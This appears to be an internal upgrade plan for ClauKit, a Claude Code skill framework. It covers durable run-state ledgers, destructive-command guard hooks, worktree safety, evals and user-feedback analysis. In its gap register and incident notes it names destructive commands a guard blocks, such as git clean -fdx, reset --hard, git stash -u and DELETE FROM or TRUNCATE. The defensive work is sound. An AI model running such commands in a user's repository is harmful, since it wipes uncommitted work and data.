# ClauKit Upgrade Plan — Durability, Evidence, Cost

**Created:** 2026-07-30 · **Status:** ✅ **implemented** (2026-07-31) · **Type:** framework upgrade (self-hosted)

---

## Implementation Status

All 31 tasks landed. Verified **by running the acceptance criteria**, not by reading diffs — where a criterion was prose ("churn drops measurably") it was replaced with an executable one before being checked off.

**Standing evidence** (re-runnable): `npm test` → **180 tests, 179 pass, 0 fail, 1 skip** (the PowerShell suite, correctly skipped on Linux) · `ck init --kit engineer` into an empty repo → 20 paths, every file `settings.json` references present, both PreToolUse hooks exit 0 on a normal command · `node -e "require('./bin/lib/kit-resolver').checkKitPathsAvailable(k)"` → `[]` for all three kits.

| Task | State | Verification |
|---|:---:|---|
| T1.0 install fix + un-ignore ledger | ✅ | 3 manifests carry `hooks`/`scripts`/`statusline`; preflight clean; `git check-ignore` confirms `STATE.md`+`plan.md` trackable. **Criterion revised during implementation:** `reports/*.md` is now trackable too — plan.md links to its reports, and an ignored report is a 404 in a PR body (T6.1a). Script-generated `review-package-*` and `*-brief-*` stay ignored |
| T1.0b test harness | ✅ | `npm test` = `node --test tests/`, zero new deps, shell suites wrapped |
| T1.1 `run-state` ledger | ✅ | skill + `references/state-schema.md`; wired into cook/flow/fix |
| T1.2 `guard-destructive` | ✅ | 18 Tier-A + 16 benign + 3 Tier-B cases (plan asked 14/12); `.sh`/`.ps1` are thin delegates — one implementation |
| T1.2b `file-claims` | ✅ | per-worktree JSONL, self-pruning (dirty + TTL), `list` CLI feeds `/ck:git cm` |
| T1.3 `scout-block` precision | ✅ | 12 allow + 9 deny cases incl. the reproduced `grep -v` false positive |
| T1.4 scoped commit | ✅ | `/ck:git cm` derives the manifest from the claim registry; knowledge in `git/SKILL.md` |
| T1.5 finish-branch + PR fallback | ✅ | `/ck:git` gains `finish`; auth failure ⇒ paste-ready, zero retries |
| T1.6 worktree fleet | ⛔ **REVERTED 2026-08-05** | shipped, then removed in production use — see the note under the T1.6 section |
| T1.7 DB safe-writes | ✅ | `database/databases/references/safe-writes.md`; guard message points to it |
| T2.1 `verify-plan` | ✅ | skill + `/ck:plan verify`; cook Stage 0.5 |
| T2.2 `tdd` + `/ck:fix tdd` | ✅ | skill + variant; baseline-first (rewritten 2026-08-05 when T1.6 was reverted), never `git stash` |
| T2.3 plan rigor | ✅ | `planning/SKILL.md` + `references/output-standards.md` |
| T2.4 scope lock | ✅ | cook Stage 0 A/B gate |
| T2.5 remote-truth rows | ✅ | added to both verification references |
| T3.1 fresh implementer/phase | ✅ | cook Implement stage |
| T3.2 context-hygiene scripts | ✅ | `phase-brief` · `review-package` · `run-workspace` |
| T3.3 model tiering | ✅ | `context-engineering/references/model-tiering.md` |
| T3.4 loop-cap + parked findings | ✅ | cook Failure Recovery |
| T3.5 multi-repo scout | ✅ | `/ck:scout` multi-repo mode (moved here from Phase 6) |
| T4.1 multi-lens review | ✅ | `/ck:review --lenses`, 4 lenses, no rationale to the falsifier |
| T4.2 headless offload | ✅ | `ci-review` + `ck-review.yml.template` + `delivery-tail` |
| T4.3 cross-service rules | ✅ | `development-rules.md` §Cross-Service; `/ck:claude-md` 5 blocks |
| T5.1 skill-activation gate | ✅ | `.claude/workflows/skill-activation.md`, in both manifests |
| T5.2 primary workflow | ✅ | rewritten to 13 gated stages |
| T5.3 registry · README · docs | ✅ | registry §9 itemises the 4 hooks + 8 scripts + harness; README counts corrected 128/28/52 → **131/29/56** (9 stale claims incl. JSON-LD). Commands are counted *logically* (registry §3 row scheme: 56 rows over 37 files — `/ck:fix ci` and `/ck:plan two` are separate entries), which is what the 52→56 sequence tracks |
| T5.4 behavioral evals | ❌ | **Sweep ran 2026-07-31 and failed: 0 of 6 gates demonstrated** (2 FAIL + 4 PASS-with-failing-negative-control). It did its job — it found a **P0 install defect (G26)**, now fixed. Post-fix re-run blocked on spend. See below |
| T5.5 `preview` narrowing | ✅ | render-markdown → `markdown-novel-viewer`; `programmatic-seo` removed |
| T6.1 declared delivery tail | ✅ | `/ck:git pr` steps 1–4 + 6 universal, step 5 ships **empty** |
| T6.1a `pr-body.md` | ✅ | 8 placeholders, fill contract, no tracker field, no AI attribution |
| T6.2 overload resilience | ✅ | tier fallback + post-dispatch diff verification |

**Post-implementation code review (2026-07-31)** found and fixed 5 defects — see `reports/code-review.md`. Net counts: **skills 129→131** (3 added, 1 removed), agents 29, commands 53→56 (logical, registry §3 scheme), workflows 14→15. A later pass (2026-07-31) added `bin/lib/claude-md-wire.js` for G26.

**Honest verification boundary (updated 2026-07-31 — the sweep ran).** Unit tests prove the hooks and scripts behave correctly *when called*; they cannot prove the model obeys a gate under pressure, and most of this plan is prompt text. The first completed `--all --negative` sweep returned **2 FAIL + 4 PASS whose negative control failed — zero gates demonstrated**, and split into two distinct findings:

- **G26 — a P0 install defect the plan never anticipated.** `verify-plan-fires` and `scope-lock` failed outright because **every workflow gate ships dark**: `ck init` copies `.claude/workflows/*.md`, but Claude Code only auto-reads `CLAUDE.md`, and nothing created or updated one. ClauKit's own repo masked it — its root `CLAUDE.md` has a §Workflows section, which is the only reason the gates fire here. Proved by a positive control (same fixture, same prompt, one variable): bare install edits source against a false root cause; with `CLAUDE.md` naming the workflows the gate holds and the claim is explicitly REFUTED. **Fixed** — `bin/lib/claude-md-wire.js`, 5 new tests, `npm test` 185/0 fail. This is exactly T1.0's defect one level up (`settings.json` wires hooks; `CLAUDE.md` wires workflows), and it means **the pre-fix behaviour of every P1 gate in Phases 2–5 was untested prose on any real install**.
- **Three scenarios remain non-discriminating.** `tdd-red-first`, `resume-from-ledger`, and `iron-law` pass with their gate blanked, because a capable base model writes the regression test, reads the `STATE.md` in front of it, and re-runs the suite unprompted. Their PASS is **not** evidence the gates work. Sharpening them requires tool-call **ordering** assertions (`--output-format stream-json`), not a reworded grep — parked with that ruling. `guard-tier-b`'s prompt named the file to commit, handing over the scoped answer; rewritten.

**Outstanding:** re-run `tests/behavior/run-scenario.sh --all --negative` after the fix. It stopped on the org monthly spend limit — every transcript the same 101-byte notice, correctly reported as ERROR rather than FAIL by the hardening T5.4 itself added. Until it runs, the installer fix rests on the positive control plus unit tests, and `verify-plan` / `scope-lock` are fixed-but-unconfirmed at the scenario level.

**Goal:** Close the gap between what ClauKit *documents* and what **295 real sessions across two end-users** *needed* — make multi-phase runs interruption-proof, make every claim evidence-backed, harden the worktree environment, and cut token burn — by porting Superpowers patterns onto ClauKit's existing skill/agent/command trio.

**Architecture:** No new layer. All work lands in the 4 existing pools (workflows · skills · agents · commands) + 2 new hooks + 8 new scripts (full inventory in Part F). Kit manifests gain `hooks` and `scripts` keys (zero CLI change — `getKitPaths` already iterates all `paths` values).

**Sources:**
- current repo state
- **User A** — `Claude Code Insights.html` (1,452 msgs / 189 sessions / 325h / 2026-07-06→29) — migration & data-remediation heavy, 43% multi-clauding
- **User B** — `report-2026-07-29-140553.html` (1,364 msgs / 106 sessions / 618h / 2026-06-25→29) — **direct `/ck:cook` user**, ticket-to-PR delivery, 29% multi-clauding, 282 live-browser sessions
- `superpowers-main/skills` (14 skills)

Two independent users on the same stack converging on the same three demands (checkpointing · evidence-before-code · headless tail) is the strongest signal in this plan. Where they diverge, User B's data is the more direct verdict on ClauKit itself — it is `/ck:cook` running in anger for 618 hours.

---

## Global Constraints

- ClauKit is **infrastructure-agnostic**. Never encode any single team's stack specifics (tracker, VCS host, framework) into skills — encode the *pattern*, put the specifics in the `/ck:claude-md` template.
- Trio rule holds: **skill = knowledge · agent = persona · command = trigger**. One concept = one primary entry point. No duplicate entries (`docs/clauKit-registry.md` is the gate).
- Never recommend native `ultracode` or the native `Workflow` runtime. `/ck:flow` stays the sole orchestration entry point.
- No new agents unless a genuinely new persona is needed (target: **0 new agents**).
- Every new/changed skill file: kebab-case, <200 lines body, frontmatter `name` + `description` matching registry.
- Every new path must be added to the kit manifests it belongs to (`.claude/kits/{engineer,both}.json`) or it will not install.
- Superpowers' voice ("your human partner", 5-round breakers) is **not** ported — ClauKit says "user" and caps loops at 3 + `retro`.

---

## Part A — Current Workflow (as-built)

### A.1 Four layers

| Layer | Count | Location | Role |
|---|---|---|---|
| Workflows | 14 md | `.claude/workflows/` | canonical prose recipes, loaded via CLAUDE.md |
| Skills | 129 | `skills/` (→ symlinked `.claude/skills`) | lazy-loaded knowledge |
| Agents | 29 | `.claude/agents/{engineering,marketing}/` | personas + tool subset + **model tier** |
| Commands | 52 | `.claude/commands/{ck,mk}/` | user triggers (25 `/ck:` + 12 `/mk:` + kit variants) |

Registry `docs/clauKit-registry.md` = single source of truth (210 entries). Kits (`engineer`/`marketing`/`both`) select path subsets.

### A.2 The primary pipeline

```
0 Brainstorm (opt, /ck:brainstorm, 7-phase)
1 Plan       (planner agent → plans/<ts>-<slug>/plan.md + phase-*.md)
2 Plan review + user /clear          ← context reset boundary
3 Implement  (main agent | frontend-developer | backend-developer)
4 Test       (tester agent)
5 Review     (code-reviewer agent)
6 Docs       (project-manager + docs-manager, parallel)
7 Debug      (debugger → loop back to 4)
```

`cook` skill adds hard gates on top: **Stage 0 Exact-Requirements Gate** (5 items: expected output · acceptance criteria · scope boundary · constraints · touchpoints) → Plan → Code → Test → Review → Docs → Deploy. Loop cap 3 per gate, then `retro`.

### A.3 Orchestration layers

1. Sequential chaining · 2. Parallel fan-out · 3. Pipeline · 4. **`/ck:flow`** (`dynamic-workflow` skill) — gated re-creation of the native dynamic-workflow model with a 4-axis inheritance contract (context/output · persona · config/gate · model/budget) + 5 quality patterns.

### A.4 What is already strong (do not rebuild)

| Capability | Where | Notes |
|---|---|---|
| Requirements gate before planning | `cook` Stage 0 | stronger than Superpowers' equivalent |
| Verification Iron Law | `code-review` skill + `debugging/references/verification.md` | already a faithful port of `verification-before-completion` |
| 4-phase systematic debugging | `debugging` skill | parity with `systematic-debugging`, plus root-cause-tracing + defense-in-depth |
| Anti-hallucination contract | `/ck:cook` "Cite or it didn't happen" | `file:line` or verbatim output, `[UNVERIFIED]` marker |
| Adversarial verify of findings | `/ck:cook` Review stage | `debugger` refutes each Critical/High before the fix loop |
| Model tiering | agent frontmatter | haiku ×4 · sonnet ×7 · opus ×4 · inherit ×1 |
| Cost preview before fan-out | `dynamic-workflow` guardrails | mandatory pre-run estimate |
| Worktree isolation knowledge | `git/worktree` skill | present but **not wired into any pipeline** |

---

## Part B — Feedback Synthesis (User A)

Hard numbers: **Bash 4,773 · Read 2,548 · Edit 1,669 · MCP DB query 989 · Agent 502 · TodoWrite 482.** 92 likely-satisfied sessions, 1 dissatisfied. Friction is **not** comprehension — it is durability, safety, and cost.

| Friction | Count | Root cause | ClauKit is missing |
|---|---|---|---|
| Buggy code (1st-pass defects) | 12 | implementing against unverified plan claims | plan-falsification gate |
| Wrong approach | 7 | same | same |
| Environment issue | 6 | — | — |
| Tool failure / limitation | 9 | MCP blocks DELETE; hook false-positives | DB write protocol; hook precision |
| Rate limit / spend kill | 4+ (≥6 sessions) | long marathon runs, no checkpoint | durable run state |

Named incidents → required countermeasure:

1. **Phase-03 subagent killed mid-flight by spend limit** → state hand-reconstructed; another session needed 4× `continue`; TodoWrite itself failed. ⇒ **durable ledger**, not TodoWrite.
2. **32-row backfill INSERT later proved invalid**; MCP blocks DELETE ⇒ manual rollback. ⇒ **dry-run + paired rollback script gate**.
3. **`git stash -u` deleted a real `node_modules`** → full toolchain reinstall; a `git-manager` subagent **bundled unrelated WIP** into commits (user interrupted). ⇒ **PreToolUse deny-list + scoped-commit protocol**.
4. **PR step failed in ≥4 sessions** (gh unauthenticated / VCS-host token invalid) → finished work left unmerged. ⇒ **draft-PR fallback, never retry**.
5. **A subagent hallucinated an `IsIncluded` flag**; plans contained false root-cause claims; one migration was proved a **no-op**. ⇒ **falsify-the-plan gate + cross-checked review**.
6. **Tests written after code** (24 + 23 + 15 tests, all post-hoc). ⇒ **TDD red-green discipline**.
7. **Hook blocked a legitimate grep** — reproduced during this analysis: `scout-block.sh` substring-matches `node_modules`, so `grep -v node_modules` is rejected. ⇒ **hook precision fix**.

The report's own three "quick wins" map 1:1 onto Phase 1 + Phase 2 below.

---

## Part B.2 — Feedback Synthesis (User B — the `/ck:cook` power user)

Numbers: **Bash 3,208 · Edit 1,245 · Read 908 · claude-in-chrome 282 · Agent 268 · Write 286.** 124 commits, 46/48 sessions mostly/fully achieved — but **dissatisfied 7** (vs User A's 1) and `wrong_approach 10` + `excessive_changes 4`, both higher than User A. Shape of work: hand over a ticket ID, expect research across 3 repos → implement → tests → draft PR → tracker transition → reviewer mention → worklog, all in one pass.

### B.2.1 — Independent confirmation (both users, different projects)

| Demand | User A evidence | User B evidence | Plan task |
|---|---|---|---|
| Checkpoint phase state to a file | ≥6 spend-kills, 4× `continue` | ≥5 sessions killed by spend/session/529; a background BE agent died leaving **no changes** | T1.1 |
| Evidence gate before code | plans with false root causes | **a wrong root cause shipped in 3 merged PRs**, needed corrective + cleanup PRs | T2.1 |
| Red test before fix | tests always post-hoc | wants failing-then-passing regression as a hard gate | T2.2 |
| Fresh adversarial reviewer | subagent hallucinated a flag | wants a falsifier with **no memory of the implementation** | T4.1 |
| Headless mechanical tail | review off the interactive path | 6 sessions *purely* PR-creation + 6 version-control | T4.2 |
| Worktree isolation | concurrent-editor stash churn | **worktrees are the #1 friction source** | T1.6 |

Two users, two projects, same six asks. Treat these as settled requirements, not hypotheses.

### B.2.2 — New signals (not present in User A's data)

**1. Worktree/toolchain self-harm is the single largest loss (`environment 9 + 4`).** Named incidents:
- a **subagent's `npm ci`** at repo root **destroyed the shared `node_modules` symlink** → `tsc`/`vitest` exit 216, mid-task recovery detour
- a **relative-path** `git worktree add` followed by `rm -rf` **deleted nested directories**
- circular `node_modules` symlink; **zod 3.x vs ^4.x skew** left FE tests and visual QA unverified
- **~20GB of stale worktrees** accumulated

⇒ my T1.6 was far too weak ("offer a worktree"). The real requirement is a **provisioned, smoke-tested, verified-green** worktree, plus hook rules that make the two destructive shapes impossible.

**2. `git stash` is unusable for baseline verification** — "a stash-based baseline **silently no-oped**" and the commit message had to be corrected. Proving a failure is pre-existing requires checking out the base commit **in a separate worktree**. Sharpens T2.2 and independently justifies T1.2's Tier-A block on bare `git stash`.

**3. Scope over-reach is a distinct failure class from wrong root cause** (`wrong_approach 10`, `excessive_changes 4`):
- a ticket planned as cross-repo backend; user cut it to **FE-only**
- `AnswerDbContext` registered in the wrong host, **violating the codebase's host-separation pattern**; retracted after challenge
- an **unrequested `backfill.sql`** artifact had to be stripped from a PR push mid-flight

⇒ cook's Stage 0 derives a "scope boundary" but never forces it to be *minimal*, never checks it against **existing architectural conventions**, and nothing forbids unrequested artifacts. New task **T2.4**.

**4. Stale VCS status reported as fact** — "Claude twice reported stale merge/deploy status from a local branch." ⇒ `git fetch origin` + check the remote ref before any merged/deployed claim. New row in the verification gates (**T2.5**).

**5. The ticket→delivery tail is a real workflow ClauKit does not have.** 14 sessions end-to-end, 9 on handoff, 6 purely PR-creation. ClauKit has `/ck:git pr` and stops there — no team-format description, and no way to express what happens after the PR opens. New task **T6.1**. Note the correct generalization: the gap is *"no mechanism for a post-PR tail"*, **not** *"missing transition/mention/worklog"* — those three are this team's tail, and a kit that hardcodes them ships their tracker's vocabulary to everyone. T6.1 supplies the mechanism and declares no steps.

**6. Cross-repo tracing is serial and wasteful** — 3,208 Bash calls, bugs spanning core/api/web, and a wrong-file guess in one cross-repo trace. Wants one **read-only agent per repo**, dispatched up front, each returning `file:line` + the data shape it observes. New task **T3.5**.

**7. Resilience to 529/overload** — a 529 forced a manual model switch and skill re-invocation. Folds into T3.3 as a fallback rule.

### B.2.3 — Explicitly rejected from this report

- **`PostToolUse` auto-`tsc --noEmit` on every Edit** (their suggested hook). A full typecheck per edit is O(edits) cost on a large TS repo and would fire mid-multi-file-change when the tree is *expected* to be red. ClauKit already mandates compile-after-phase in `primary-workflow.md`; the right enforcement point is the **phase exit gate** (T2.3), not every keystroke. Offer it as a documented opt-in, not a default.
- **Hardcoding one team's tracker/VCS/stack specifics** into skills — violates this plan's Global Constraints. Pattern in the skill, specifics in the CLAUDE.md template.

---

## Part C — Superpowers Port Matrix

| Superpowers skill | ClauKit today | Decision |
|---|---|---|
| `verification-before-completion` | `code-review` skill (Iron Law + gates) | ✅ already ported — no action |
| `systematic-debugging` | `debugging` skill (4 phases + tracing + DiD) | ✅ already ported — no action |
| `brainstorming` | `/ck:brainstorm` 7-phase + `brainstormer` agent | ✅ stronger — no action |
| `requesting-code-review` | `code-review/references/requesting-code-review.md` | ✅ ported — extend with lenses (T4.1) |
| `receiving-code-review` | `code-review/references/code-review-reception.md` | ✅ ported — no action |
| `writing-plans` | `planning` skill | ⚠️ **PORT** Global Constraints · Interfaces · No-Placeholders · machine-checkable gates (T2.3) |
| `executing-plans` | `/ck:cook --from-plan` | ⚠️ **PORT** critical-review-of-plan-first (T2.1) |
| `subagent-driven-development` | `cook` Implement stage (main agent) | ⚠️ **PORT** ledger · fresh-implementer-per-phase · artifacts-as-files · model tiering (T1.1, T3.1–T3.4) |
| `test-driven-development` | `test-automation` (infra only) | 🆕 **NEW SKILL** (T2.2) |
| `using-git-worktrees` | `git/worktree` skill exists, unwired | ⚠️ **WIRE IN** (T1.6) |
| `finishing-a-development-branch` | `/ck:git pr\|merge` | ⚠️ **PORT** verify→menu→fallback (T1.5) |
| `dispatching-parallel-agents` | `orchestration-protocol` fan-out | ✅ ported — no action |
| `using-superpowers` (bootstrap gate) | CLAUDE.md advisory sentence | ⚠️ **PORT** hard gate + Red-Flags table (T5.1) |
| `writing-skills` | `template-skill` + `document-skills` | ✅ covered — no action |

**Net from Superpowers specifically:** 2 new skills (`tdd`, and `run-state` as the SDD-ledger port), 0 new agents; everything else is an edit to an existing file. The remaining new artifacts in Part F come from the two feedback reports, not from Superpowers.

---

## Part C.2 — ClauKit vs Superpowers (full comparison: [reports/superpowers-comparison.md](reports/superpowers-comparison.md))

Not competing implementations — opposite scope choices. **ClauKit: 129 skills / 81,539 lines / 29 agents / 52 commands / 2 test files / 1 harness. Superpowers: 14 skills / 7,169 lines / 0 agents / 0 commands / 12 test suites + an LLM eval harness / 11 harnesses.**

ClauKit carries ~11× the content on ~1/6 the verification. The decisive asymmetry: **ClauKit's widest coverage (marketing, SEO, docs, infra) is where Superpowers has none, and ClauKit's thinnest layer — the execution loop — is exactly where Superpowers is deepest** (`subagent-driven-development` is 503 lines vs `cook`'s ~130). Both feedback reports failed on that thin layer, never on missing capability, which is why Phases 1–3 target it.

ClauKit wins on: declarative agent personas with tool subsets + model tiers (Superpowers expresses model choice as defeatable prose), the command surface, manifest-driven kits, domain breadth, mandatory cost preview, and a registry with duplicate detection.

Superpowers wins on: **mechanical enforcement** (a SessionStart hook re-injecting the activation skill on `startup|clear|compact` — it survives compaction), execution-loop depth, **behavioural verification**, portability, and governance that gates skill edits on eval evidence.

**The transferable idea is a posture, not a skill:** treat behaviour-shaping content as code and gate changes on evidence the behaviour changed. ClauKit imported the *text* of `debugging` and `code-review` without the enforcement or verification machinery around them — they read well and cannot be shown to work. → **T5.4**.

---

## Part D — Gap Register

Severity: **P0** blocks correct use · **P1** causes the measured friction · **P2** quality/cost.

| ID | Gap | Sev | Evidence |
|---|---|:---:|---|
| G0 | **`ck init` installs `settings.json` but never installs `.claude/hooks/` or `statusline.js`** — no kit manifest declares them. Fresh install → every Bash call hits a PreToolUse hook whose script is absent. | **P0** | `grep hooks .claude/kits/*.json` → no match; `settings.json` is in every manifest's `config` |
| G1 | No durable run state. Progress lives in TodoWrite + prose plan → a mid-phase kill costs full reconstruction. | **P1** | ≥6 spend-killed sessions; TodoWrite failed repeatedly |
| G2 | No plan-falsification gate. Stage 0 checks requirement *completeness*, never claim *truth*. | **P1** | buggy_code 12 + wrong_approach 7; plans with false root causes |
| G3 | No TDD discipline. `/ck:fix test` is suite-driven, not red-green. | **P1** | all test suites written post-hoc |
| G4 | `/ck:git cm` literally instructs "**Stage all files**" — the exact behavior that bundled foreign WIP. | **P1** | `.claude/commands/ck/git.md:17,21`; user interrupted `git-manager` |
| G5 | No destructive-op guard. `git stash -u`, `git add -A`, **`git commit -am`**, `reset --hard`, `clean -fdx`, `DELETE FROM`, `TRUNCATE` all pass. | **P1** | node_modules destroyed |
| G5b | **No concurrency awareness between parallel sessions.** Nothing in ClauKit knows another session is editing the same tree, so every whole-tree git op is a coin flip and the "session manifest" concept relies on model recall. | **P1** | 211 overlap events / 158 sessions / 43% of messages; a `git-manager` subagent bundled foreign WIP and had to be interrupted |
| G6 | `scout-block` hook substring-matches → false positives on legitimate excludes. | **P1** | reproduced this session |
| G7 | No DB-write protocol (dry-run SELECT → row count → paired rollback in same commit → approval). | **P1** | invalid 32-row backfill; `database` skill has zero "dry-run"/"rollback" content |
| G8 | Plans lack machine-checkable exit gates, Global Constraints, Interfaces blocks, no-placeholder rule. | **P1** | plan status claims proved wrong |
| G9 | Implement stage runs in the main agent → context accrues across phases → cost blowup. | **P1** | 989 DB queries + 2,548 Reads in one context lineage |
| G10 | No context-hygiene tooling (brief / report / review-package as files). Protocol says "don't inline" but nothing enforces it. | P2 | — |
| G11 | Model tier is fixed per agent, not per task complexity; dispatches may omit `model` and silently inherit opus. | P2 | spend-limit friction |
| G12 | `/ck:git pr` dead-ends on auth failure (no draft fallback). | **P1** | ≥4 sessions, work left unmerged |
| G13 | Review is single-lens, post-hoc. No adversary/fidelity/blast-radius fan-out, no cross-check. | P2 | 9 findings in one feature; subagent hallucination |
| G14 | No headless/CI review path. | P2 | review = 3rd most common goal (12 sessions), all interactive |
| G15 | Skill activation advisory only — no hard gate, no rationalization table. | P2 | — |
| G16 | Worktree skill exists but no pipeline uses it — **and it is knowledge-only: no provisioning script, no smoke gate, no doctor, no safe teardown.** | **P1** | User B: `npm ci` killed the shared symlink (exit 216); relative-path worktree + `rm -rf` deleted nested dirs; ~20GB stale worktrees; User A: stash churn lost Phase-03 edits |
| G17 | Cross-service deploy-order / feature-flag pattern documented nowhere. | P2 | 500 on headerValues |
| G18 | **No scope-minimality gate.** Stage 0 records a scope boundary but never forces the *smallest* surface, never checks the change against existing architectural conventions, and nothing forbids unrequested artifacts in a PR-bound branch. | **P1** | User B: `wrong_approach 10` + `excessive_changes 4`; a ticket cut cross-repo→FE-only; host-separation violation; stray `backfill.sql` |
| G19 | **Baseline verification via `git stash` silently no-ops** — and nothing in ClauKit says so. | **P1** | User B: stash-based baseline no-oped, commit message needed correcting |
| G20 | Merged/deployed status claimed from local branch state; no `git fetch` + remote-ref check in the verification gates. | **P1** | User B: stale status reported twice |
| G21 | **No post-PR tail mechanism.** `/ck:git pr` stops at creation, with no team-format description and **no way for a project to declare what runs after the PR opens** — so every project retypes its own tail. (The gap is the missing mechanism; the specific steps are per-project.) | **P1** | User B: 14 end-to-end sessions, 9 handoff, **6 purely PR-creation** |
| G22 | `/ck:scout` has no multi-repo mode; cross-repo tracing runs serially through the main agent. *(Addressed by T3.5 — Phase 3, not Phase 6.)* | P2 | User B: 3,208 Bash calls, wrong-file guess in a cross-repo trace |
| G23 | No fallback on 529/overload — a transient API error costs a manual model switch and skill re-invocation. | P2 | User B: 529 forced re-invoke |
| G25 | **ClauKit's two canonical pipeline docs disagree about stage 0, and the mandatory gate is the one that's missing.** `primary-workflow.md` defines stage 0 as *Brainstorming (optional)* and **never mentions the Exact-Requirements Gate** (verified: no match for `requirement`/`acceptance criteria`/`scope boundary`/`touchpoint` in the whole file). The gate exists only in `cook/SKILL.md:53`, where it is declared a **hard gate / UNSKIPPABLE**. CLAUDE.md points at `primary-workflow.md` **first**, so a session that follows the declared primary workflow never encounters the mandatory gate unless it independently loads the `cook` skill. | **P1** | The gate's own rationale — *"AI coding fails far more often from a vague spec the model silently guesses around than from model weakness"* — is exactly User B's `wrong_approach 10` + `excessive_changes 4`. The strongest gate in the framework is invisible from the document that advertises the pipeline. |
| G26 | **`ck init` installs the workflows but nothing loads them.** Claude Code auto-reads `CLAUDE.md`; `.claude/workflows/*.md` is a ClauKit convention that works *only* because a `## Workflows` section points at it. The installer never created or updated one, so on every fresh install the skill-activation hard gate (T5.1), the 13-stage primary workflow (T5.2), and `development-rules.md` were inert files. **The sibling of G0** — that was "hooks installed but `settings.json` not wired"; this is "workflows installed but `CLAUDE.md` not wired". Found by T5.4, not by review. | **P0** | Positive control, one variable: bare `ck init` → source edited against a plan whose root cause is false; `+ CLAUDE.md` naming the workflows → no edit, claim explicitly REFUTED. ClauKit's own repo hid it — the framework's gates fire here and nowhere else |
| G24 | **Nothing verifies that any behavioural rule actually fires.** 129 skills, 81k lines, **2 test files — both for one hook**. Every Iron Law, gate, and red-flag table in the repo is an untested assertion. | **P1** | Part C.2: Superpowers gates skill edits on an LLM eval harness + 12 test suites; ClauKit imported its skill *text* without the verification machinery |

---

## Part E — Upgrade Plan

5 phases, sequenced by measured friction. **Phase 1 alone removes the two costliest failure modes.** Each task lists exact deliverables + acceptance criteria.

---

### Phase 1 — Durability & Safety (P0/P1) — *stop losing work*

**Execution order:** T1.0 (install bug + un-ignore the ledger — unblocks everything) → T1.0b (test harness, without which the next three tasks have no acceptance path) → T1.3 (fix the existing hook's precision **before** adding a second hook) → T1.2b (claim registry — the substrate T1.2 and T1.4 both consume) → T1.2 (guard) → T1.6 (worktrees) → T1.1 (ledger) → T1.4 (scoped commit) → T1.5 (finish-branch) → T1.7 (DB protocol). Three hard dependencies: T1.0's `.gitignore` fix before T1.1, T1.0b before T1.3/T1.2, and T1.2b before T1.2.

#### T1.0 — Fix the install (G0) · **P0**
- **Deliverable:** add `"hooks": [".claude/hooks/"]` and `"statusline": [".claude/statusline.js", ".claude/statusline.sh", ".claude/statusline.ps1"]` to `paths` in `.claude/kits/engineer.json`, `marketing.json`, `both.json`.
- No CLI change: `getKitPaths()` (`bin/lib/kit-resolver.js:85`) already flattens every `paths` value; `checkKitPathsAvailable` pre-flight will now cover them.
- **Second deliverable — un-ignore the ledger (blocks T1.1).** Apply the verified `.gitignore` stanza from T1.1 to this repo. Without it `STATE.md` and `plan.md` are both untrackable and `git clean -fdx` deletes them, so the durability work has nothing to stand on.
- **Acceptance:** `cd /tmp/fresh && node <repo>/bin/ck.js init --kit engineer` → `.claude/hooks/scout-block.js` + `.claude/statusline.js` exist; a `Bash` call in that project does not error on the PreToolUse hook. In this repo, `git check-ignore plans/<any>/STATE.md` exits non-zero (not ignored) while `plans/<any>/reports/` stays ignored.

#### T1.0b — Test harness (blocks T1.2, T1.3) · **P0-adjacent**
The plan asks for 26 unit tests (T1.2), a regression test (T1.3), and script tests (T1.6) — but there is **no runner**: [`tests/`](../../tests/) holds two shell scripts and `npm test` is literally `bash tests/test-scout-block.sh`. As specified, none of those acceptance criteria are executable.
- **Deliverable:** adopt **`node:test`** (built into Node ≥18, zero new dependencies, matches the existing Node hooks and the T3.2/T1.6 scripts). Rewrite `npm test` to `node --test tests/`. Keep the two shell scripts as-is and wrap them in a `node:test` case so one command runs everything.
- Chosen over vitest/jest because ClauKit ships as a CLI other projects install — a test framework in `dependencies` is a cost every consumer pays, and `node:test` is already present wherever `ck` runs.
- **Acceptance:** `npm test` runs shell + JS suites in one invocation, exits non-zero on any failure, and requires no `npm install` in a clean checkout.

#### T1.1 — `run-state` skill: the durable ledger (G1)
- **New:** `skills/software/run-state/SKILL.md` (+ `references/state-schema.md`).
- **Location (decided):** `plans/<plan>/STATE.md` — beside the plan it tracks, committed with the phase it records, so a resume after a machine loss can pull it from the remote.
- **⚠ Blocker found: the location does not work as-is.** [`.gitignore:59`](../../.gitignore#L59) is `plans/**/*`, so today `STATE.md` is **neither committable nor safe from `git clean -fdx`** (`-x` deletes ignored files) — the exact sequence D1 chose this location to survive. **`plan.md` is ignored too**, which separately breaks T6.1a's `{{plan_path}}` link (a PR body would link a file that was never pushed). Fixing this is a **T1.0 deliverable**, not a note.
  - **Verified fix** (tested in a scratch repo — the naive one-line negation silently fails, because a file cannot be re-included once a parent directory is excluded):
    ```gitignore
    plans/**/*
    !plans/**/          # re-include directories first — without this the lines below are dead
    !plans/**/plan.md
    !plans/**/phase-*.md
    !plans/**/STATE.md
    ```
    Result: `plan.md`, `phase-*.md`, `STATE.md` tracked; `plans/**/reports/` (bulky agent output) still ignored. Confirmed with `git status --porcelain --ignored`.
  - The `run-state` skill must state the dependency plainly: **an ignored ledger is a broken ledger.** On start, if `git check-ignore plans/<plan>/STATE.md` matches, warn once and name the fix — a downstream project that ignores `plans/` inherits the same defect, and it is invisible until the run that needed the ledger is already dead.
- Contract: every multi-phase run owns `plans/<plan>/STATE.md`, first line = `# run-state — plan: <plan path>`. Append-only. One line per event:
  - `phase <N>: started (base <sha7>)`
  - `phase <N>: gate <name> → PASS|FAIL (evidence: <cmd> → <result>)`
  - `phase <N>: complete (commits <a7>..<b7>, tests <X/Y>, review clean|<K> parked)`
  - `phase <N>: parked — <finding> — ruling: <why>`
  - `phase <N>: BLOCKED — <reason>`
- **Resume protocol (the core value):** on start, **re-derive** true state from git log + working tree + gate re-runs. Never trust the plan's own status claims — the report shows plans in this repo were wrong. Emit a derived-state table before touching code.
- Rules: ledger is authoritative over recollection after compaction; TodoWrite is a UI mirror, never the record; a killed run resumes from `STATE.md` + gate scripts alone.
- **Parallel-session safety:** one ledger per *plan*, not per repo — concurrent sessions working different plans never touch the same file. Writes are append-only single lines (`>>`), so even two sessions on the same plan interleave without clobbering. A ledger whose first line names a different plan is another run's record: leave it, start your own.
- **Wire into:** `/ck:cook` (write after every stage), `/ck:flow` (after every phase gate), `/ck:fix` (after diagnose + verify), `orchestration-protocol.md` (§Context Preservation), `cook` skill Failure Recovery.
